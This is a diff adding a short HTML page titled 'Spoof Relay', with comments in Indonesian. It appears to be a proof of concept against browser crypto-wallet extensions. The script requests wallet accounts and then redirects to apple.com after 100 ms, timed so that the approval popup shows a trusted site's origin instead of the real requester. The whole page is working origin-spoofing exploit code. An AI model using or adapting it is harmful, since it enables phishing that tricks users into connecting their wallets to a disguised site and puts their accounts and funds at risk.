@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Spoof Relay</title>
+</head>
+<body>
+  <h2>Connecting Wallet…</h2>
+  <p id="msg">Please approve the popup.</p>
+
+  <script>
+    (async () => {
+      if (!window.ethereum) {
+        document.getElementById('msg').innerText = 'No wallet installed!';
+        return;
+      }
+
+      try {
+        // 1. Inisiasi koneksi (popup extension muncul, origin = this window)
+        const accountsPromise = window.ethereum.request({
+          method: 'eth_requestAccounts'
+        });
+
+        // 2. Setting delay kecil agar redirect terjadi SEBELUM popup baca origin
+        setTimeout(() => {
+          window.location.href = 'https://apple.com';
+        }, 100);  // 100ms – sesuaikan jika perlu lebih cepat/lambat
+
+        // 3. Tunggu hasil koneksi
+        const accounts = await accountsPromise;
+        document.getElementById('msg').innerText =
+          'Connected: ' + accounts[0];
+      } catch (err) {
+        document.getElementById('msg').innerText = 'Connection failed';
+        console.error(err);
+      }
+    })();
+  </script>
+</body>
+</html>
